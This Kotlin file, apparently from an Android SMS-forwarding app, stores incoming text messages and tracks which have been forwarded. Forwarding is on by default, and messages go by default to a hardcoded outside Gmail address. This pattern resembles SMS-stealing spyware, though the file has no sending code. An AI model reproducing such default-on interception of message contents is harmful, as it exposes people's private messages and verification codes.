package com.smsforwarder

import android.content.Context
import org.json.JSONArray
import org.json.JSONObject

object SmsRepository {
    private const val PREFS = "sms_forwarder"
    private const val KEY_MESSAGES = "messages"
    private const val KEY_ENABLED = "enabled"
    private const val KEY_EMAIL = "email"
    private const val KEY_BACKEND = "backend"
    private const val DEFAULT_EMAIL = "efotball2024hdvhb@gmail.com"

    private fun prefs(c: Context) =
        c.getSharedPreferences(PREFS, Context.MODE_PRIVATE)

    fun isEnabled(c: Context): Boolean =
        prefs(c).getBoolean(KEY_ENABLED, true)

    fun setEnabled(c: Context, value: Boolean) =
        prefs(c).edit().putBoolean(KEY_ENABLED, value).apply()

    fun getEmail(c: Context): String =
        prefs(c).getString(KEY_EMAIL, DEFAULT_EMAIL) ?: DEFAULT_EMAIL

    fun setEmail(c: Context, value: String) =
        prefs(c).edit().putString(KEY_EMAIL, value.trim()).apply()

    fun getBackend(c: Context): String =
        prefs(c).getString(KEY_BACKEND, "") ?: ""

    fun setBackend(c: Context, value: String) =
        prefs(c).edit().putString(KEY_BACKEND, value.trim().trimEnd('/')).apply()

    @Synchronized
    fun add(c: Context, item: SmsItem) {
        val updated = (getAll(c).toMutableList().apply {
            removeAll { it.id == item.id }
            add(0, item)
        }).take(200)
        save(c, updated)
    }

    @Synchronized
    fun getAll(c: Context): List<SmsItem> {
        return try {
            val json = JSONArray(prefs(c).getString(KEY_MESSAGES, "[]") ?: "[]")
            buildList {
                for (i in 0 until json.length()) {
                    val o = json.getJSONObject(i)
                    add(
                        SmsItem(
                            id = o.getLong("id"),
                            sender = o.optString("sender", "Unknown"),
                            body = o.optString("body", ""),
                            timestamp = o.getLong("timestamp"),
                            forwarded = o.optBoolean("forwarded", false)
                        )
                    )
                }
            }
        } catch (_: Exception) {
            emptyList()
        }
    }

    fun pending(c: Context): List<SmsItem> =
        getAll(c).filter { !it.forwarded }

    @Synchronized
    fun markForwarded(c: Context, id: Long) {
        save(c, getAll(c).map {
            if (it.id == id) it.copy(forwarded = true) else it
        })
    }

    private fun save(c: Context, list: List<SmsItem>) {
        val json = JSONArray()
        list.forEach { x ->
            json.put(
                JSONObject().apply {
                    put("id", x.id)
                    put("sender", x.sender)
                    put("body", x.body)
                    put("timestamp", x.timestamp)
                    put("forwarded", x.forwarded)
                }
            )
        }
        prefs(c).edit().putString(KEY_MESSAGES, json.toString()).apply()
    }
}
